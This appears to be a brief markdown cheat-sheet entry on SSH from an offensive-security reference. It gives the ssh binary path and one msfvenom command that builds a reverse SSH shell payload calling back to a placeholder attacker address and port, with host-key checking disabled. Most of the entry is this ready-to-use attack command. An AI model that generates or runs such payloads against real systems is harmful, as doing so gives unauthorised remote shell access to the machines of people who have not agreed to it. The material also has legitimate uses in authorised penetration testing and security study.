# SSH

## 01 - Common Files

```
/usr/bin/ssh
```

## 02 - Generate Payloads

```
$ msfvenom -p cmd/unix/reverse_ssh shellpath=/bin/sh [sshpath=/path/to/ssh] sshclientoptions="UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" lhost=<IP> lport=<PORT>
```